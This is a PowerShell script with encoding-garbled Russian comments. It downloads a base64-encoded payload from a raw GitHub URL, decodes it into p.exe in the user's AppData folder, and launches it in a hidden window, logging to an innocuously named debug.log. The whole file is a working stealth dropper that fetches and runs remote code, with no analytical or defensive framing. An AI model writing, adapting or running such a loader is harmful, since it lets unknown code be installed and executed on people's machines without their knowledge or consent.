# === ÐÐÐ¡Ð¢Ð ÐžÐ™ÐšÐ˜ ===
$PayloadUrl   = "https://raw.githubusercontent.com/jimboslimuser/p/main/payload.b64"
$InstallPath  = "$env:APPDATA\p"
$ExePath      = "$InstallPath\p.exe"
$LogPath      = "$InstallPath\debug.log"

# === Ð¡ÐžÐ—Ð”ÐÐÐ˜Ð• ÐŸÐÐŸÐšÐ˜ ===
if (-not (Test-Path $InstallPath)) { New-Item -ItemType Directory -Path $InstallPath | Out-Null }

function Log($msg) {
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | $msg" | Add-Content $LogPath
}

# === Ð—ÐÐ“Ð Ð£Ð—ÐšÐ payload.b64 ===
try {
    Log "Ð¡ÐºÐ°Ñ‡Ð¸Ð²Ð°Ð½Ð¸Ðµ payload..."
    $b = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($PayloadUrl))
} catch {
    Log "ÐžÑˆÐ¸Ð±ÐºÐ° Ð·Ð°Ð³Ñ€ÑƒÐ·ÐºÐ¸: $($_.Exception.Message)"
    exit 1
}

# === ÐŸÐ ÐžÐ’Ð•Ð ÐšÐ Ð ÐÐ—ÐœÐ•Ð Ð ===
$expectedSize = $b.Length
Log "ÐžÐ¶Ð¸Ð´Ð°ÐµÐ¼Ñ‹Ð¹ Ñ€Ð°Ð·Ð¼ÐµÑ€ Ñ„Ð°Ð¹Ð»Ð°: $expectedSize Ð±Ð°Ð¹Ñ‚"

# === Ð—ÐÐŸÐ˜Ð¡Ð¬ .EXE ===
if (Test-Path $ExePath) {
    try {
        $existingBytes = [IO.File]::ReadAllBytes($ExePath)
        if ($existingBytes.Length -eq $expectedSize) {
            Log "Ð¤Ð°Ð¹Ð» ÑƒÐ¶Ðµ ÐµÑÑ‚ÑŒ Ð¸ Ñ†ÐµÐ»Ð¾ÑÑ‚ÐµÐ½. ÐŸÑ€Ð¾Ð¿ÑƒÑÐºÐ°ÐµÐ¼ Ð·Ð°Ð¿Ð¸ÑÑŒ."
        } else {
            Log "ÐÐ°Ð¹Ð´ÐµÐ½ ÑÑ‚Ð°Ñ€Ñ‹Ð¹ Ñ„Ð°Ð¹Ð» Ð´Ñ€ÑƒÐ³Ð¾Ð³Ð¾ Ñ€Ð°Ð·Ð¼ÐµÑ€Ð° â€” Ð¿ÐµÑ€ÐµÐ·Ð°Ð¿Ð¸ÑÑ‹Ð²Ð°ÐµÐ¼..."
            [IO.File]::WriteAllBytes($ExePath, $b)
            Log "Ð—Ð°Ð¿Ð¸ÑÐ°Ð½Ð¾: $ExePath"
        }
    } catch {
        Log "ÐžÑˆÐ¸Ð±ÐºÐ° Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ¸ Ñ„Ð°Ð¹Ð»Ð°: $($_.Exception.Message)"
        exit 1
    }
} else {
    try {
        [IO.File]::WriteAllBytes($ExePath, $b)
        Log "Ð—Ð°Ð¿Ð¸ÑÐ°Ð½Ð¾: $ExePath"
    } catch {
        Log "ÐžÑˆÐ¸Ð±ÐºÐ° Ð·Ð°Ð¿Ð¸ÑÐ¸: $($_.Exception.Message)"
        exit 1
    }
}

# === Ð—ÐÐŸÐ£Ð¡Ðš .EXE Ð‘Ð•Ð— ÐžÐšÐžÐ ===
Log "Ð—Ð°Ð¿ÑƒÑÐº $ExePath..."
try {
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c start """" `"$ExePath`" /B" -WindowStyle Hidden -NoNewWindow
    Log "ÐŸÑ€Ð¾Ñ†ÐµÑÑ Ð·Ð°Ð¿ÑƒÑ‰ÐµÐ½ (PID: $((Get-Process -Name 'p' -ErrorAction SilentlyContinue).Id -join ','))"
} catch {
    Log "ÐžÑˆÐ¸Ð±ÐºÐ° Ð·Ð°Ð¿ÑƒÑÐºÐ°: $($_.Exception.Message)"
}